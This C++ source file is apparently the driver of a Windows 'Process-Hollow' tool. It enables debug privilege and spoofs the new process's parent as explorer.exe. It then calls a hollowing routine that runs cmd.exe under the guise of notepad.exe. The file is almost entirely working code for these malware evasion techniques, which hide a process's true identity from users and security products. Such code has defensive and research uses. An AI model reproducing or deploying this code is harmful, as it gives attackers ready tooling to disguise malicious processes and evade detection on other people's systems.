#include "stdafx.h"
#include "Native.h"
#include "ProcessHollowed.h"

#include <lmerr.h>
#include <tlhelp32.h>

static void DisplayErrorText(DWORD aDosError)
{
    HMODULE vModule         = nullptr; // default to system source
    LPSTR   vMessageBuffer  = nullptr;
    DWORD   vBufferLength   = 0;

    DWORD vFormatFlags =
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_IGNORE_INSERTS |
        FORMAT_MESSAGE_FROM_SYSTEM;

    //
    // If dwLastError is in the network range, 
    //  load the message source.
    //

    if (aDosError >= NERR_BASE && aDosError <= MAX_NERR)
    {
        vModule = LoadLibraryExA("netmsg.dll", nullptr, LOAD_LIBRARY_AS_DATAFILE);

        if (vModule != nullptr)
        {
            vFormatFlags |= FORMAT_MESSAGE_FROM_HMODULE;
        }
    }

    //
    // Call FormatMessage() to allow for message 
    //  text to be acquired from the system 
    //  or from the supplied module handle.
    //

    if (vBufferLength = FormatMessageA(
        vFormatFlags,
        vModule, // module to get message from (NULL == system)
        aDosError,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // default language
        (LPSTR)& vMessageBuffer,
        0,
        nullptr))
    {
        DWORD vBytesWritten;

        //
        // Output message string on stderr.
        //
        WriteFile(
            GetStdHandle(STD_ERROR_HANDLE),
            vMessageBuffer,
            vBufferLength,
            &vBytesWritten,
            nullptr);

        //
        // Free the buffer allocated by the system.
        //
        LocalFree(vMessageBuffer);
    }

    //
    // If we loaded a message source, unload it.
    //
    if (vModule != nullptr)
    {
        FreeLibrary(vModule);
    }
}

bool EnablePrivilege(LPCTSTR aPrivilegeName, bool aEnable)
{
    bool    vResult = false;
    HANDLE  vToken  = nullptr;
    for (;;)
    {
        LUID                vLuid{};
        TOKEN_PRIVILEGES    vPrivileges{};

        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &vToken))
            break;

        if (!LookupPrivilegeValue(nullptr, aPrivilegeName, &vLuid))
            break;

        vPrivileges.PrivilegeCount = 1;
        vPrivileges.Privileges[0].Luid = vLuid;
        vPrivileges.Privileges[0].Attributes = aEnable ? SE_PRIVILEGE_ENABLED : 0;

        if (!AdjustTokenPrivileges(vToken, FALSE, &vPrivileges, sizeof(vPrivileges), nullptr, nullptr))
            break;

        vResult = true;
        break;
    }
    if (vToken)
    {
        CloseHandle(vToken), vToken = nullptr;
    }

    return vResult;
}

HANDLE OpenProcessWithName(DWORD aDesiredAccess, BOOL aInheritHandle, LPCWSTR aProcessName)
{
    DWORD vDosError = NOERROR;

    HANDLE vProcessHandle = nullptr;
    HANDLE vSnapHandle    = nullptr;
    for (;;)
    {
        vSnapHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (nullptr == vSnapHandle)
        {
            vDosError = GetLastError();
            break;
        }

        PROCESSENTRY32W vEntry{};
        vEntry.dwSize = sizeof(vEntry);

        if (!Process32FirstW(vSnapHandle, &vEntry))
        {
            vDosError = GetLastError();
            break;
        }

        DWORD vProcessId = 0;
        do
        {
            if (0 == _wcsicmp(vEntry.szExeFile, aProcessName))
            {
                vProcessId = vEntry.th32ProcessID;
                break;
            }

        } while (Process32Next(vSnapHandle, &vEntry));
        if (0 == vProcessId)
        {
            vDosError = ERROR_NOT_FOUND;
            break;
        }

        vProcessHandle = OpenProcess(aDesiredAccess, aInheritHandle, vProcessId);
        if (nullptr == vProcessHandle)
        {
            vDosError = GetLastError();
            break;
        }

        break;
    }
    if (vSnapHandle)
    {
        CloseHandle(vSnapHandle), vSnapHandle = nullptr;
    }

    return SetLastError(vDosError), vProcessHandle;
}

void printhelp()
{
    printf("Please:\n");
    printf("Process-Hollow.exe ProcessPath [ProcessArgs]\n");
    printf("    ProcessArgs is Optional\n");
}

int wmain(int argc, wchar_t* argv[])
{
    setlocale(LC_ALL, "");

    DWORD vDosError = NOERROR;

    HANDLE vParentHandle    = nullptr;
    HANDLE vSelfToken       = nullptr;
    HANDLE vNewToken        = nullptr;
    auto vAttributeList     = LPPROC_THREAD_ATTRIBUTE_LIST();

    for (;;)
    {
        //if (argc < 2)
        //{
        //    void printhelp();
        //    vDosError = ERROR_INVALID_PARAMETER;
        //    break;
        //}
        //
        //auto vRealApp   = argv[1];
        //auto vArgs      = argc == 3 ? argv[2] : (wchar_t*)nullptr;

        auto vRealApp   = LR"(C:\Windows\System32\cmd.exe)";
        auto vArgs      = (wchar_t*)nullptr;
        
        //////////////////////////////////////////////////////////////////////////

        Wow64EnableWow64FsRedirection(FALSE);

        EnablePrivilege(SE_DEBUG_NAME, true);
        vParentHandle = OpenProcessWithName(PROCESS_CREATE_PROCESS, FALSE, L"explorer.exe");
        if (nullptr == vParentHandle)
        {
            vDosError = GetLastError();
            break;
        }
        EnablePrivilege(SE_DEBUG_NAME, false);
        printf("[+] OpenProces(explorer.exe), Handle 0x%IX\n", (size_t)vParentHandle);

        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &vSelfToken))
        {
            vDosError = GetLastError();
            break;
        }
        printf("[+] Open Self Token, Handle 0x%IX\n", (size_t)vSelfToken);

        if (!DuplicateTokenEx(
            vSelfToken,
            TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
            nullptr, SecurityImpersonation, TokenPrimary, &vNewToken))
        {
            vDosError = GetLastError();
            break;
        }
        printf("[+] Duplicate Self Token, Handle 0x%IX\n", (size_t)vNewToken);

        SIZE_T vAttributeListSize = 0u;
        InitializeProcThreadAttributeList(nullptr, 2, 0, &vAttributeListSize);

        vAttributeList = (decltype(vAttributeList))new UINT8[vAttributeListSize]{};
        if (nullptr == vAttributeList)
        {
            vDosError = ERROR_INSUFFICIENT_BUFFER;
            break;
        }

        if (!InitializeProcThreadAttributeList(
            vAttributeList,
            2,
            0,
            &vAttributeListSize))
        {
            vDosError = GetLastError();
            break;
        }

        if (!UpdateProcThreadAttribute(
            vAttributeList,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &vParentHandle,
            sizeof(vParentHandle),
            nullptr,
            nullptr))
        {
            vDosError = GetLastError();
            break;
        }
        printf("[+] UpdateProcThreadAttribute() Set Praent Handle.\n");

        wchar_t vSysdir[MAX_PATH]{};
        GetSystemDirectoryW(vSysdir, _countof(vSysdir));
        printf("[+] Got System directory, %ls.\n", vSysdir);

        //////////////////////////////////////////////////////////////////////////

        auto vStartup = STARTUPINFOEXW();
        vStartup.StartupInfo.cb  = sizeof(vStartup);
        vStartup.lpAttributeList = vAttributeList;

        auto vProcessInfo = PROCESS_INFORMATION();
        vDosError = CreateProcessHollowed(
            vNewToken,
            nullptr,
            LR"(C:\Windows\System32\notepad.exe)",
            vRealApp,
            vArgs,
            nullptr, nullptr, FALSE,
            EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
            nullptr, vSysdir,
            (LPSTARTUPINFOW)& vStartup, &vProcessInfo);
        if (NOERROR != vDosError)
        {
            break;
        }

        CloseHandle(vProcessInfo.hThread);
        CloseHandle(vProcessInfo.hProcess);
        break;
    }
    if (vAttributeList)
    {
        DeleteProcThreadAttributeList(vAttributeList), vAttributeList = nullptr;
    }
    if (vNewToken)
    {
        CloseHandle(vNewToken), vNewToken = nullptr;
    }
    if (vSelfToken)
    {
        CloseHandle(vSelfToken), vSelfToken = nullptr;
    }
    if (vParentHandle)
    {
        CloseHandle(vParentHandle), vParentHandle = nullptr;
    }
    if (NOERROR != vDosError)
    {
        DisplayErrorText(vDosError);
    }

    return vDosError;
}
